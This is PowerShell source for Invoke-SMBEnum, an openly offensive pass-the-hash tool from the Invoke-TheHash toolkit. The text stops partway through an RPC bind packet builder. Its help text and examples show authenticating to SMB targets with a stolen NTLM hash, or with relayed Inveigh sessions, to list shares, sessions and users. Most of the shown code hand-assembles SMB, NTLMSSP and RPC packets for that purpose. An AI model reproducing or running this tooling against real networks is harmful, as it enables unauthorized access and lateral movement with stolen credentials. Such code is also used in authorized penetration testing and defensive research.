function Invoke-SMBEnum
{
<#
.SYNOPSIS
Invoke-SMBEnum performs enumeration tasks over SMB with NTLMv2 pass the hash authentication. Invoke-SMBEnum
supports SMB2 with and without SMB signing.

Author: Kevin Robertson (@kevin_robertson)
License: BSD 3-Clause

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Action
(NetSession,Share,User) Default = Share

.PARAMETER Sleep
Default = 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.PARAMETER Session
Inveigh-Relay authenticated session.

.PARAMETER SigningCheck
(Switch) Checks to see if SMB signing is required on a target.

.EXAMPLE
List shares.
Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
List NetSessions.
Invoke-SMBEnum -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action NetSession

.EXAMPLE
List local users using an authenticated Inveigh-Relay session.
Invoke-SMBEnum -Session 1 -Action User

.EXAMPLE
Check if SMB signing is required.
Invoke-SMBEnum -Target 192.168.100.20 -SigningCheck

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Target,
    [parameter(ParameterSetName='Default',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Default',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][ValidateSet("NetSession","Share","User")][String]$Action = "Share",
    [parameter(ParameterSetName='Default',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(ParameterSetName='Default',Mandatory=$false)][Switch]$SigningCheck,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$packet_header_length,[Int]$packet_data_length)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
    $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

    $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NetBIOSSessionService.Add("Message_Type",[Byte[]](0x00))
    $packet_NetBIOSSessionService.Add("Length",[Byte[]]($packet_netbios_session_service_length))

    return $packet_NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

    $packet_process_ID = $packet_process_ID[0,1]

    $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $packet_SMBHeader.Add("Command",$packet_command)
    $packet_SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $packet_SMBHeader.Add("Reserved",[Byte[]](0x00))
    $packet_SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("Flags",$packet_flags)
    $packet_SMBHeader.Add("Flags2",$packet_flags2)
    $packet_SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("TreeID",$packet_tree_ID)
    $packet_SMBHeader.Add("ProcessID",$packet_process_ID)
    $packet_SMBHeader.Add("UserID",$packet_user_ID)
    $packet_SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $packet_SMBHeader
}

function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$packet_version)

    if($packet_version -eq 'SMB1')
    {
        [Byte[]]$packet_byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$packet_byte_count = 0x22,0x00  
    }

    $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $packet_SMBNegotiateProtocolRequest.Add("ByteCount",$packet_byte_count)
    $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($packet_version -ne 'SMB1')
    {
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $packet_SMBNegotiateProtocolRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$packet_command,[Byte[]]$packet_credit_request,[Int]$packet_message_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

    [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

    $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $packet_SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $packet_SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $packet_SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("Command",$packet_command)
    $packet_SMB2Header.Add("CreditRequest",$packet_credit_request)
    $packet_SMB2Header.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("MessageID",$packet_message_ID)
    $packet_SMB2Header.Add("ProcessID",$packet_process_ID)
    $packet_SMB2Header.Add("TreeID",$packet_tree_ID)
    $packet_SMB2Header.Add("SessionID",$packet_session_ID)
    $packet_SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $packet_SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $packet_SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_security_blob_length = $packet_security_blob_length[0,1]

    $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $packet_SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $packet_SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $packet_SMB2SessionSetupRequest.Add("SecurityBufferLength",$packet_security_blob_length)
    $packet_SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("Buffer",$packet_security_blob)

    return $packet_SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
    $packet_path_length = $packet_path_length[0,1]

    $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $packet_SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $packet_SMB2TreeConnectRequest.Add("PathLength",$packet_path_length)
    $packet_SMB2TreeConnectRequest.Add("Buffer",$packet_path)

    return $packet_SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$packet_named_pipe)

    $packet_named_pipe_length = [System.BitConverter]::GetBytes($packet_named_pipe.Length)
    $packet_named_pipe_length = $packet_named_pipe_length[0,1]

    $packet_SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $packet_SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $packet_SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $packet_SMB2CreateRequestFile.Add("NameLength",$packet_named_pipe_length)
    $packet_SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequestFile.Add("Buffer",$packet_named_pipe)

    return $packet_SMB2CreateRequestFile
}

function New-PacketSMB2QueryInfoRequest
{
    param ([Byte[]]$packet_info_type,[Byte[]]$packet_file_info_class,[Byte[]]$packet_output_buffer_length,[Byte[]]$packet_input_buffer_offset,[Byte[]]$packet_file_ID,[Int]$packet_buffer)

    [Byte[]]$packet_buffer_bytes = ,0x00 * $packet_buffer

    $packet_SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2QueryInfoRequest.Add("StructureSize",[Byte[]](0x29,0x00))
    $packet_SMB2QueryInfoRequest.Add("InfoType",$packet_info_type)
    $packet_SMB2QueryInfoRequest.Add("FileInfoClass",$packet_file_info_class)
    $packet_SMB2QueryInfoRequest.Add("OutputBufferLength",$packet_output_buffer_length)
    $packet_SMB2QueryInfoRequest.Add("InputBufferOffset",$packet_input_buffer_offset)
    $packet_SMB2QueryInfoRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("InputBufferLength",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("AdditionalInformation",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2QueryInfoRequest.Add("FileID",$packet_file_ID)

    if($packet_buffer -gt 0)
    {
        $packet_SMB2QueryInfoRequest.Add("Buffer",$packet_buffer_bytes)
    }

    return $packet_SMB2QueryInfoRequest
}

function New-PacketSMB2ReadRequest
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2ReadRequest.Add("Padding",[Byte[]](0x50))
    $packet_SMB2ReadRequest.Add("Flags",[Byte[]](0x00))
    $packet_SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))
    $packet_SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("FileID",$packet_file_ID)
    $packet_SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $packet_SMB2ReadRequest
}

function New-PacketSMB2WriteRequest
{
    param([Byte[]]$packet_file_ID,[Int]$packet_RPC_length)

    [Byte[]]$packet_write_length = [System.BitConverter]::GetBytes($packet_RPC_length)

    $packet_SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))
    $packet_SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))
    $packet_SMB2WriteRequest.Add("Length",$packet_write_length)
    $packet_SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("FileID",$packet_file_ID)
    $packet_SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))
    $packet_SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $packet_SMB2WriteRequest
}

function New-PacketSMB2CloseRequest
{
    param ([Byte[]]$packet_file_ID)

    $packet_SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))
    $packet_SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))
    $packet_SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2CloseRequest.Add("FileID",$packet_file_ID)

    return $packet_SMB2CloseRequest
}

function New-PacketSMB2TreeDisconnectRequest
{
    $packet_SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2TreeDisconnectRequest
}

function New-PacketSMB2SessionLogoffRequest
{
    $packet_SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))
    $packet_SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $packet_SMB2SessionLogoffRequest
}

function New-PacketSMB2IoctlRequest
{
    param([Byte[]]$packet_function,[Byte[]]$packet_file_name,[Int]$packet_length,[Int]$packet_out_size)

    [Byte[]]$packet_length_bytes = [System.BitConverter]::GetBytes($packet_length + 24)
    [Byte[]]$packet_out_size_bytes = [System.BitConverter]::GetBytes($packet_out_size)

    $packet_SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2IoctlRequest.Add("StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2IoctlRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Function",$packet_function)
    $packet_SMB2IoctlRequest.Add("GUIDHandle",$packet_file_name)
    $packet_SMB2IoctlRequest.Add("InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("InData_Length",$packet_length_bytes)
    $packet_SMB2IoctlRequest.Add("MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("MaxIoctlOutSize",$packet_out_size_bytes)
    $packet_SMB2IoctlRequest.Add("Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))

    if($packet_out_size -eq 40)
    {
        $packet_SMB2IoctlRequest.Add("InData_Capabilities",[Byte[]](0x7f,0x00,0x00,0x00))
        $packet_SMB2IoctlRequest.Add("InData_ClientGUID",[Byte[]](0xc7,0x11,0x73,0x1e,0xa5,0x7d,0x39,0x47,0xaf,0x92,0x2d,0x88,0xc0,0x44,0xb1,0x1e))
        $packet_SMB2IoctlRequest.Add("InData_SecurityMode",[Byte[]](0x01))
        $packet_SMB2IoctlRequest.Add("InData_Unknown",[Byte[]](0x00))
        $packet_SMB2IoctlRequest.Add("InData_DialectCount",[Byte[]](0x02,0x00))
        $packet_SMB2IoctlRequest.Add("InData_Dialect",[Byte[]](0x02,0x02))
        $packet_SMB2IoctlRequest.Add("InData_Dialect2",[Byte[]](0x10,0x02))
    }

    return $packet_SMB2IoctlRequest
}

#NTLM

function New-PacketNTLMSSPNegotiate
{
    param([Byte[]]$packet_negotiate_flags,[Byte[]]$packet_version)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes(32 + $packet_version.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[0]
    [Byte[]]$packet_ASN_length_1 = $packet_NTLMSSP_length[0] + 32
    [Byte[]]$packet_ASN_length_2 = $packet_NTLMSSP_length[0] + 22
    [Byte[]]$packet_ASN_length_3 = $packet_NTLMSSP_length[0] + 20
    [Byte[]]$packet_ASN_length_4 = $packet_NTLMSSP_length[0] + 2

    $packet_NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))
    $packet_NTLMSSPNegotiate.Add("InitialcontextTokenLength",$packet_ASN_length_1)
    $packet_NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenLength",$packet_ASN_length_2)
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add("InnerContextTokenLength2",$packet_ASN_length_3)
    $packet_NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))
    $packet_NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))
    $packet_NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))
    $packet_NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))
    $packet_NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
    $packet_NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))
    $packet_NTLMSSPNegotiate.Add("MechTokenLength",$packet_ASN_length_4)
    $packet_NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))
    $packet_NTLMSSPNegotiate.Add("NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
    $packet_NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add("NegotiateFlags",$packet_negotiate_flags)
    $packet_NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($packet_version)
    {
        $packet_NTLMSSPNegotiate.Add("Version",$packet_version)
    }

    return $packet_NTLMSSPNegotiate
}

function New-PacketNTLMSSPAuth
{
    param([Byte[]]$packet_NTLM_response)

    [Byte[]]$packet_NTLMSSP_length = [System.BitConverter]::GetBytes($packet_NTLM_response.Length)
    $packet_NTLMSSP_length = $packet_NTLMSSP_length[1,0]
    [Byte[]]$packet_ASN_length_1 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 12)
    $packet_ASN_length_1 = $packet_ASN_length_1[1,0]
    [Byte[]]$packet_ASN_length_2 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 8)
    $packet_ASN_length_2 = $packet_ASN_length_2[1,0]
    [Byte[]]$packet_ASN_length_3 = [System.BitConverter]::GetBytes($packet_NTLM_response.Length + 4)
    $packet_ASN_length_3 = $packet_ASN_length_3[1,0]

    $packet_NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength",$packet_ASN_length_1)
    $packet_NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength2",$packet_ASN_length_2)
    $packet_NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))
    $packet_NTLMSSPAuth.Add("ASNLength3",$packet_ASN_length_3)
    $packet_NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))
    $packet_NTLMSSPAuth.Add("NTLMSSPLength",$packet_NTLMSSP_length)
    $packet_NTLMSSPAuth.Add("NTLMResponse",$packet_NTLM_response)

    return $packet_NTLMSSPAuth
}

#RPC

function New-PacketRPCBind
{
    param([Byte[]]$packet_frag_length,[Int]$packet_call_ID,[Byte[]]$packet_num_ctx_items,[Byte[]]$packet_context_ID,[Byte[]]$packet_UUID,[Byte[]]$packet_UUID_version)

    [Byte[]]$packet_call_ID_bytes = [System.BitConverter]::GetBytes($packet_call_ID)

    $packet_RPCBind = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_RPCBind.Add("Version",[Byte[]](0x05))
    $packet_RPCBind.Add("VersionMinor",[Byte[]](0x00))
    $packet_RPCBind.Add("PacketType",[Byte[]](0x0b))
    $packet_RPCBind.Add("PacketFlags",[Byte[]](0x03))
    $packet_RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))
    $packet_RPCBind.Add("FragLength",$packet_frag_length)
    $packet_RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("CallID",$packet_call_ID_bytes)
    $packet_RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))
    $packet_RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_RPCBind.Add("NumCtxItems",$packet_num_ctx_items)
    $packet_RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))
    $packet_RPCBind.Add("ContextID",$packet_context_ID)
    $packet_RPCBind.Add("NumTransItems",[Byte[]](0x01))
    $packet_RPCBind.Add("Unknown2",[Byte[]](0x00))
    $packet_RPCBind.Add("Interface",$packet_UUID)
    $packet_RPCBind.Add("InterfaceVer",$packet_UUID_version)
    $packet_RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))
    $packet_RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    $packet_RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($packet_num_ctx_items[0] -eq 2)
    {
        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface2",$packet_UUID)
        $packet_RPCBind.Add("InterfaceVer2",$packet_UUID_version)
        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif($packet_num_ctx_items[0] -eq 3)
    {
        $packet_RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))
        $packet_RPCBind.Add("NumTransItems2",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown3",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface2",$packet_UUID)
        $packet_RPCBind.Add("InterfaceVer2",$packet_UUID_version)
        $packet_RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        $packet_RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))
        $packet_RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))
        $packet_RPCBind.Add("NumTransItems3",[Byte[]](0x01))
        $packet_RPCBind.Add("Unknown4",[Byte[]](0x00))
        $packet_RPCBind.Add("Interface3",$packet_UUID)
        $packet_RPCBind.Add("InterfaceVer3",$packet_UUID_version)
        $packet_RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))
        $packet_RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        $packet_RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))
    }

    if($packet_call_ID -eq 3)
    {
        $packet_RPCBind.Add("AuthType",[Byte[]](0x0a))
        $packet_RPCBind.Add("AuthLevel",[Byte[]](0x02))
        $packet_RPCBind.Add("AuthPadLength",[Byte[]](0x00))
        $packet_RPCBind.Add("AuthReserved",[Byte[]](0x00))
        $packet_RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))
